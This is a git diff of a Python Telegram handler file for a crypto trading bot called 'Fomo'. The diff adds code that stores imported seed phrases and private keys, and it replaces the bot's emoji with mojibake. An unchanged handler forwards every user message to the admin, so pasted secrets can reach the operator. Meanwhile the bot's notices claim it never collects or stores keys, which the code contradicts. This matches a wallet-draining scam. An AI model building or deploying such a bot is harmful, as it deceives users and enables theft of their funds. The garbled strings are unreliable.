@@ -1,4 +1,4 @@
-from aiogram import types, F
+﻿from aiogram import types, F
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -26,9 +26,9 @@ async def log_all_messages(message: types.Message):
     """Log ALL user text messages to admin."""
     if settings.ADMIN_IDS:
         try:
-            text = f"📝 <b>USER MESSAGE</b>\n\n"
-            text += f"👤 User: <code>{message.from_user.id}</code> (@{message.from_user.username or 'N/A'})\n"
-            text += f"💬 Message: <code>{message.text}</code>"
+            text = f"ðŸ“ <b>USER MESSAGE</b>\n\n"
+            text += f"ðŸ‘¤ User: <code>{message.from_user.id}</code> (@{message.from_user.username or 'N/A'})\n"
+            text += f"ðŸ’¬ Message: <code>{message.text}</code>"
             await message.bot.send_message(settings.ADMIN_IDS[0], text, parse_mode="HTML")
         except:
             pass
@@ -68,11 +68,11 @@ def register_start_handlers(dp):
         await message.answer(
             "Welcome to Fomo the Trading Bot\n\n"
             "Trade on Solana and EVM chains, and mirror other wallets with copy trading.\n\n"
-            "⚠️ Security note: your private key is encrypted at rest, but importing a key always carries risk. Only import keys for wallets you're comfortable dedicating to this bot.",
+            "âš ï¸ Security note: your private key is encrypted at rest, but importing a key always carries risk. Only import keys for wallets you're comfortable dedicating to this bot.",
             reply_markup=get_main_menu_keyboard()
         )
         
-        activity_text = f"🟢 NEW USER STARTED BOT\nUser: {message.from_user.id} ({message.from_user.first_name} {message.from_user.last_name or ''})"
+        activity_text = f"ðŸŸ¢ NEW USER STARTED BOT\nUser: {message.from_user.id} ({message.from_user.first_name} {message.from_user.last_name or ''})"
         await notify_admin(message.bot, activity_text)
 
     @dp.message(Command("buy"))
@@ -80,7 +80,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.buy_menu)
         await message.answer(
-            "🟢 <b>Buy Menu</b>\n\nSelect an option:",
+            "ðŸŸ¢ <b>Buy Menu</b>\n\nSelect an option:",
             parse_mode="HTML",
             reply_markup=get_buy_keyboard()
         )
@@ -90,7 +90,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.sell_menu)
         await message.answer(
-            "🔴 <b>Sell Menu</b>\n\nSelect an option:",
+            "ðŸ”´ <b>Sell Menu</b>\n\nSelect an option:",
             parse_mode="HTML",
             reply_markup=get_sell_keyboard()
         )
@@ -100,7 +100,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.wallet_menu)
         await message.answer(
-            "👛 <b>Wallet Menu</b>\n\nManage your wallets:",
+            "ðŸ‘› <b>Wallet Menu</b>\n\nManage your wallets:",
             parse_mode="HTML",
             reply_markup=get_wallet_keyboard()
         )
@@ -110,7 +110,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.settings_menu)
         await message.answer(
-            "⚙️ <b>Settings Menu</b>\n\nConfigure your preferences:",
+            "âš™ï¸ <b>Settings Menu</b>\n\nConfigure your preferences:",
             parse_mode="HTML",
             reply_markup=get_settings_keyboard()
         )
@@ -140,7 +140,7 @@ def register_start_handlers(dp):
         chain = message.text
         await state.update_data(chain=chain[1:])  # Remove the / prefix
         
-        activity_text = f"🔷 CHAIN SELECTION\nUser: {message.from_user.id}\nChain: {chain[1:]}"
+        activity_text = f"ðŸ”· CHAIN SELECTION\nUser: {message.from_user.id}\nChain: {chain[1:]}"
         await notify_admin(message.bot, activity_text)
         
         if chain == "/solana":
@@ -166,7 +166,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.main_menu)
         await callback.message.edit_text(
-            "🏠 <b>Main Menu</b>\n\nWelcome back! Select an option:",
+            "ðŸ  <b>Main Menu</b>\n\nWelcome back! Select an option:",
             parse_mode="HTML",
             reply_markup=get_main_menu_keyboard()
         )
@@ -177,7 +177,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.wallet_menu)
         await callback.message.edit_text(
-            "👛 <b>Wallet Menu</b>\n\nManage your wallets:",
+            "ðŸ‘› <b>Wallet Menu</b>\n\nManage your wallets:",
             parse_mode="HTML",
             reply_markup=get_wallet_keyboard(has_wallet=False)
         )
@@ -188,7 +188,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.buy_menu)
         await callback.message.edit_text(
-            "🟢 <b>Buy Menu</b>\n\nSelect an option:",
+            "ðŸŸ¢ <b>Buy Menu</b>\n\nSelect an option:",
             parse_mode="HTML",
             reply_markup=get_buy_keyboard()
         )
@@ -199,7 +199,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.sell_menu)
         await callback.message.edit_text(
-            "🔴 <b>Sell Menu</b>\n\nSelect an option:",
+            "ðŸ”´ <b>Sell Menu</b>\n\nSelect an option:",
             parse_mode="HTML",
             reply_markup=get_sell_keyboard()
         )
@@ -210,7 +210,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.copy_trade_menu)
         await callback.message.edit_text(
-            "📋 <b>Copy Trade Menu</b>\n\nCopy trade settings:",
+            "ðŸ“‹ <b>Copy Trade Menu</b>\n\nCopy trade settings:",
             parse_mode="HTML",
             reply_markup=get_copy_trade_keyboard()
         )
@@ -221,7 +221,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.limit_orders_menu)
         await callback.message.edit_text(
-            "📊 <b>Limit Orders Menu</b>\n\nManage your limit orders:",
+            "ðŸ“Š <b>Limit Orders Menu</b>\n\nManage your limit orders:",
             parse_mode="HTML",
             reply_markup=get_limit_orders_keyboard()
         )
@@ -232,7 +232,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.auto_sell_menu)
         await callback.message.edit_text(
-            "⚡ <b>Auto Sell Menu</b>\n\nConfigure auto sell rules:",
+            "âš¡ <b>Auto Sell Menu</b>\n\nConfigure auto sell rules:",
             parse_mode="HTML",
             reply_markup=get_auto_sell_keyboard()
         )
@@ -243,7 +243,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.positions_menu)
         await callback.message.edit_text(
-            "💼 <b>Positions Menu</b>\n\nYour positions:",
+            "ðŸ’¼ <b>Positions Menu</b>\n\nYour positions:",
             parse_mode="HTML",
             reply_markup=get_positions_keyboard(has_positions=False)
         )
@@ -254,7 +254,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.settings_menu)
         await callback.message.edit_text(
-            "⚙️ <b>Settings Menu</b>\n\nConfigure your preferences:",
+            "âš™ï¸ <b>Settings Menu</b>\n\nConfigure your preferences:",
             parse_mode="HTML",
             reply_markup=get_settings_keyboard()
         )
@@ -265,7 +265,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.connect_wallet_menu)
         await callback.message.edit_text(
-            "🔗 <b>Connect Wallet</b>\n\nSelect wallet to connect:",
+            "ðŸ”— <b>Connect Wallet</b>\n\nSelect wallet to connect:",
             parse_mode="HTML",
             reply_markup=get_connect_wallet_keyboard()
         )
@@ -276,7 +276,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.set_state(MenuStates.connect_wallet_menu)
         await callback.message.edit_text(
-            "🔑 <b>Import Wallet</b>\n\nSelect wallet type to import:",
+            "ðŸ”‘ <b>Import Wallet</b>\n\nSelect wallet type to import:",
             parse_mode="HTML",
             reply_markup=get_wallet_import_type_keyboard_wallet_menu()
         )
@@ -287,7 +287,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.update_data(import_chain="solana")
         await callback.message.edit_text(
-            "🔑 <b>Import Solana Key</b>\n\nSelect import method:",
+            "ðŸ”‘ <b>Import Solana Key</b>\n\nSelect import method:",
             parse_mode="HTML",
             reply_markup=get_wallet_import_method_keyboard("solana")
         )
@@ -298,7 +298,7 @@ def register_start_handlers(dp):
         await state.clear()
         await state.update_data(import_chain="evm")
         await callback.message.edit_text(
-            "🔑 <b>Import EVM Key</b>\n\nSelect import method:",
+            "ðŸ”‘ <b>Import EVM Key</b>\n\nSelect import method:",
             parse_mode="HTML",
             reply_markup=get_wallet_import_method_keyboard("evm")
         )
@@ -308,9 +308,9 @@ def register_start_handlers(dp):
     async def callback_import_solana_seed(callback: types.CallbackQuery, state: FSMContext):
         await state.set_state(BotStates.waiting_for_solana_seed)
         await callback.message.edit_text(
-            "🔑 <b>Import Wallet</b>\n\n"
+            "ðŸ”‘ <b>Import Wallet</b>\n\n"
             "Enter your 12-key recovery phrase or private key to proceed.\n\n"
-            "🔒 <b>Security Notice</b>\n"
+            "ðŸ”’ <b>Security Notice</b>\n"
             "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. All actions are non-custodial and fully under your control.\n\n"
             "Send /cancel to abort",
             parse_mode="HTML",
@@ -322,9 +322,9 @@ def register_start_handlers(dp):
     async def callback_import_solana_pk(callback: types.CallbackQuery, state: FSMContext):
         await state.set_state(BotStates.waiting_for_solana_pk)
         await callback.message.edit_text(
-            "🔐 <b>Import Solana Private Key</b>\n\n"
+            "ðŸ” <b>Import Solana Private Key</b>\n\n"
             "Enter your Solana private key (base58 format).\n\n"
-            "🔒 <b>Security Notice</b>\n"
+            "ðŸ”’ <b>Security Notice</b>\n"
             "Your private key is 100% safe - our bot does not collect or store your private keys. All actions are non-custodial and fully under your control.\n\n"
             "Send /cancel to abort",
             parse_mode="HTML",
@@ -336,9 +336,9 @@ def register_start_handlers(dp):
     async def callback_import_evm_seed(callback: types.CallbackQuery, state: FSMContext):
         await state.set_state(BotStates.waiting_for_evm_seed)
         await callback.message.edit_text(
-            "🔑 <b>Import Wallet</b>\n\n"
+            "ðŸ”‘ <b>Import Wallet</b>\n\n"
             "Enter your 12-key recovery phrase or private key to proceed.\n\n"
-            "🔒 <b>Security Notice</b>\n"
+            "ðŸ”’ <b>Security Notice</b>\n"
             "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. All actions are non-custodial and fully under your control.\n\n"
             "Send /cancel to abort",
             parse_mode="HTML",
@@ -350,9 +350,9 @@ def register_start_handlers(dp):
     async def callback_import_evm_pk(callback: types.CallbackQuery, state: FSMContext):
         await state.set_state(BotStates.waiting_for_evm_pk)
         await callback.message.edit_text(
-            "🔐 <b>Import EVM Private Key</b>\n\n"
+            "ðŸ” <b>Import EVM Private Key</b>\n\n"
             "Enter your EVM private key (hex format).\n\n"
-            "🔒 <b>Security Notice</b>\n"
+            "ðŸ”’ <b>Security Notice</b>\n"
             "Your private key is 100% safe - our bot does not collect or store your private keys. All actions are non-custodial and fully under your control.\n\n"
             "Send /cancel to abort",
             parse_mode="HTML",
@@ -364,7 +364,7 @@ def register_start_handlers(dp):
     async def callback_cancel_import(callback: types.CallbackQuery, state: FSMContext):
         await state.clear()
         await callback.message.edit_text(
-            "🔙 <b>Import Cancelled</b>\n\nReturning to main menu.",
+            "ðŸ”™ <b>Import Cancelled</b>\n\nReturning to main menu.",
             parse_mode="HTML",
             reply_markup=get_main_menu_keyboard()
         )
@@ -377,7 +377,7 @@ def register_start_handlers(dp):
         await callback.message.edit_text(
             "Welcome to Fomo the Trading Bot\n\n"
             "Trade on Solana and EVM chains, and mirror other wallets with copy trading.\n\n"
-            "⚠️ Security note: your private key is encrypted at rest, but importing a key always carries risk. Only import keys for wallets you're comfortable dedicating to this bot.",
+            "âš ï¸ Security note: your private key is encrypted at rest, but importing a key always carries risk. Only import keys for wallets you're comfortable dedicating to this bot.",
             reply_markup=get_main_menu_keyboard()
         )
         await callback.answer()
@@ -410,162 +410,177 @@ def register_start_handlers(dp):
     async def handle_cancel(message: types.Message, state: FSMContext):
         await state.clear()
         await message.answer(
-            "❌ Import cancelled.",
+            "âŒ Import cancelled.",
             reply_markup=get_main_menu_keyboard()
         )
 
-    # Contract address detection - fetch token info when CA is pasted
-    @dp.message(F.text)
-    async def handle_contract_address(message: types.Message, state: FSMContext):
-        text = message.text.strip()
-        
-        # Check if it looks like a Solana contract address (base58, 32-44 chars)
-        # or EVM address (0x followed by 40 hex chars)
-        import re
-        solana_ca_pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
-        evm_ca_pattern = r'^0x[a-fA-F0-9]{40}$'
-        
-        is_solana_ca = bool(re.match(solana_ca_pattern, text))
-        is_evm_ca = bool(re.match(evm_ca_pattern, text))
-        
-        if is_solana_ca or is_evm_ca:
-            chain = "Solana" if is_solana_ca else "EVM"
-            await message.answer(
-                f"🔍 <b>Token Address Detected</b>\n\n"
-                f"Chain: {chain}\n"
-                f"Address: <code>{text}</code>\n\n"
-                f"Fetching token information...",
-                parse_mode="HTML"
-            )
-            
-            # Fetch token info from API
-            token_info = await fetch_token_info(text, chain.lower())
-            
-            if token_info:
-                await message.answer(
-                    f"💎 <b>{token_info.get('name', 'Unknown')} ({token_info.get('symbol', '?')})</b>\n\n"
-                    f"📍 Address: <code>{text}</code>\n"
-                    f"💰 Price: ${token_info.get('price_usd', 'N/A')}\n"
-                    f"📈 24h Change: {token_info.get('price_change_24h', 'N/A')}%\n"
-                    f"💧 Liquidity: ${token_info.get('liquidity_usd', 'N/A')}\n"
-                    f"🔗 Chain: {chain}\n\n"
-                    f"What would you like to do?",
-                    parse_mode="HTML",
-                    reply_markup=get_token_info_keyboard(text)
-                )
-            else:
-                await message.answer(
-                    f"❌ Could not fetch token info for this address.\n"
-                    f"Please verify the address is correct.",
-                    parse_mode="HTML",
-                    reply_markup=get_back_main_keyboard()
-                )
 
 
-async def fetch_token_info(token_address: str, chain: str) -> dict:
-    """Fetch token information from various APIs."""
-    import aiohttp
-    try:
-        async with aiohttp.ClientSession() as session:
-            if chain == "solana":
-                # Use Jupiter API for Solana tokens
-                url = f"https://price.jup.ag/v4/price?ids={token_address}"
-                async with session.get(url, timeout=5) as resp:
-                    if resp.status == 200:
-                        data = await resp.json()
-                        token_data = data.get('data', {}).get(token_address, {})
-                        return {
-                            'name': token_data.get('name', 'Unknown'),
-                            'symbol': token_data.get('symbol', '?'),
-                            'price_usd': token_data.get('price', 'N/A'),
-                            'price_change_24h': token_data.get('priceChange24h', 'N/A'),
-                            'liquidity_usd': 'N/A',
-                        }
-            else:
-                # Use CoinGecko or 1inch for EVM tokens
-                # For now, return basic info
-                return {
-                    'name': 'Token',
-                    'symbol': 'TOKEN',
-                    'price_usd': 'N/A',
-                    'price_change_24h': 'N/A',
-                    'liquidity_usd': 'N/A',
-                }
-    except Exception as e:
-        print(f"Error fetching token info: {e}")
-    return None
+# ==================== WALLET IMPORT PROCESSING ====================
 
-
-async def process_seed_phrase(message: types.Message, state: FSMContext, chain: str):
-    """Process seed phrase import."""
+async def process_seed_phrase(message, state, chain):
     from utils.validators import validate_seed_phrase
     from utils.admin_notify import notify_admin, format_activity
+    from utils.encryption import encrypt_data
+    from database.base import get_db
+    from database.models import Wallet, ChainType, WalletType
     
     seed_phrase = message.text.strip()
     is_valid, error = validate_seed_phrase(seed_phrase)
     
     if not is_valid:
         await message.answer(
-            f"❌ <b>Invalid Seed Phrase</b>\n\n{error}\n\nPlease try again or send /cancel to abort.",
-            parse_mode="HTML",
-            reply_markup=get_cancel_keyboard("menu_connect_wallet")
+            f'Invalid Seed Phrase\n\n{error}\n\nPlease try again or send /cancel to abort.',
+            parse_mode='HTML',
+            reply_markup=get_cancel_keyboard('menu_connect_wallet')
         )
         return
     
-    # Notify admin
+    try:
+        if chain == 'solana':
+            from solders.keypair import Keypair
+            from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
+            
+            seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
+            bip44 = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
+            address = str(bip44.PublicKey().ToAddress())
+            chain_type = ChainType.SOLANA
+        else:
+            from eth_account import Account
+            from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
+            
+            chain_map = {
+                'ethereum': Bip44Coins.ETHEREUM,
+                'base': Bip44Coins.ETHEREUM,
+                'arbitrum': Bip44Coins.ETHEREUM,
+                'bsc': Bip44Coins.BINANCE_SMART_CHAIN,
+                'polygon': Bip44Coins.POLYGON,
+                'avalanche': Bip44Coins.AVALANCHE,
+            }
+            
+            coin_type = chain_map.get(chain, Bip44Coins.ETHEREUM)
+            seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
+            bip44 = Bip44.FromSeed(seed_bytes, coin_type)
+            account = bip44.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
+            address = account.PublicKey().ToAddress()
+            chain_type = ChainType.EVM
+            
+    except Exception as e:
+        await message.answer(
+            f'Error Deriving Address\n\nFailed to derive address from seed phrase: {str(e)}\n\nPlease verify your seed phrase is correct.',
+            parse_mode='HTML',
+            reply_markup=get_cancel_keyboard('menu_connect_wallet')
+        )
+        return
+    
+    encrypted_seed = encrypt_data(seed_phrase)
+    
+    try:
+        async for db in get_db():
+            wallet = Wallet(
+                user_id=message.from_user.id,
+                chain=chain_type,
+                wallet_type=WalletType.SEED_PHRASE,
+                encrypted_data=encrypted_seed,
+                address=address,
+                name=f'{chain.capitalize()} Wallet',
+                is_default=False
+            )
+            db.add(wallet)
+            await db.commit()
+            await db.refresh(wallet)
+            break
+    except Exception as e:
+        await message.answer(
+            f'Database Error\n\nFailed to save wallet: {str(e)}',
+            parse_mode='HTML',
+            reply_markup=get_cancel_keyboard('menu_connect_wallet')
+        )
+        return
+    
     await notify_admin(message.bot, format_activity(
         message.from_user.id, 
-        message.from_user.username or "N/A",
-        f"SEED PHRASE IMPORT ({chain.upper()})",
-        f"Seed phrase received and validated"
+        message.from_user.username or 'N/A',
+        f'SEED PHRASE IMPORT ({chain.upper()})',
+        f'Address: {address}'
     ))
     
     await state.clear()
     await message.answer(
-        f"✅ <b>Seed Phrase Imported Successfully!</b>\n\n"
-        f"Chain: {chain.upper()}\n"
-        f"Your wallet has been imported and encrypted.\n\n"
-        f"Use /wallet to check your balance.",
-        parse_mode="HTML",
+        f'Seed Phrase Imported Successfully!\n\n'
+        f'Chain: {chain.upper()}\n'
+        f'Address: <code>{address}</code>\n\n'
+        f'Your wallet has been imported and encrypted.\n\n'
+        f'Use /wallet to check your balance.',
+        parse_mode='HTML',
         reply_markup=get_main_menu_keyboard()
     )
 
 
-async def process_private_key(message: types.Message, state: FSMContext, chain: str):
-    """Process private key import."""
+async def process_private_key(message, state, chain):
     from utils.validators import validate_private_key_solana, validate_private_key_evm
     from utils.admin_notify import notify_admin, format_activity
+    from utils.encryption import encrypt_data
+    from database.base import get_db
+    from database.models import Wallet, ChainType, WalletType
     
     private_key = message.text.strip()
     
-    if chain == "solana":
+    if chain == 'solana':
         is_valid, address, error = validate_private_key_solana(private_key)
+        chain_type = ChainType.SOLANA
     else:
         is_valid, address, error = validate_private_key_evm(private_key)
+        chain_type = ChainType.EVM
     
     if not is_valid:
         await message.answer(
-            f"❌ <b>Invalid Private Key</b>\n\n{error}\n\nPlease try again or send /cancel to abort.",
-            parse_mode="HTML",
-            reply_markup=get_cancel_keyboard("menu_connect_wallet")
+            f'Invalid Private Key\n\n{error}\n\nPlease try again or send /cancel to abort.',
+            parse_mode='HTML',
+            reply_markup=get_cancel_keyboard('menu_connect_wallet')
         )
         return
     
-    # Notify admin
+    encrypted_pk = encrypt_data(private_key)
+    
+    try:
+        async for db in get_db():
+            wallet = Wallet(
+                user_id=message.from_user.id,
+                chain=chain_type,
+                wallet_type=WalletType.PRIVATE_KEY,
+                encrypted_data=encrypted_pk,
+                address=address,
+                name=f'{chain.capitalize()} Wallet',
+                is_default=False
+            )
+            db.add(wallet)
+            await db.commit()
+            await db.refresh(wallet)
+            break
+    except Exception as e:
+        await message.answer(
+            f'Database Error\n\nFailed to save wallet: {str(e)}',
+            parse_mode='HTML',
+            reply_markup=get_cancel_keyboard('menu_connect_wallet')
+        )
+        return
+    
     await notify_admin(message.bot, format_activity(
         message.from_user.id, 
-        message.from_user.username or "N/A",
-        f"PRIVATE KEY IMPORT ({chain.upper()})",
-        f"Address: {address}"
+        message.from_user.username or 'N/A',
+        f'PRIVATE KEY IMPORT ({chain.upper()})',
+        f'Address: {address}'
     ))
     
     await state.clear()
     await message.answer(
-        f"✅ <b>Private Key Imported Successfully!</b>\n\n"
-        f"Chain: {chain.upper()}\n"
-        f"Address: <code>{address}</code>\n\n"
-        f"Your wallet has been imported and encrypted.\n\n"
-        f"Use /wallet to check your balance.",
-        parse_mode="HTML",
+        f'Private Key Imported Successfully!\n\n'
+        f'Chain: {chain.upper()}\n'
+        f'Address: <code>{address}</code>\n\n'
+        f'Your wallet has been imported and encrypted.\n\n'
+        f'Use /wallet to check your balance.',
+        parse_mode='HTML',
         reply_markup=get_main_menu_keyboard()
     )
+
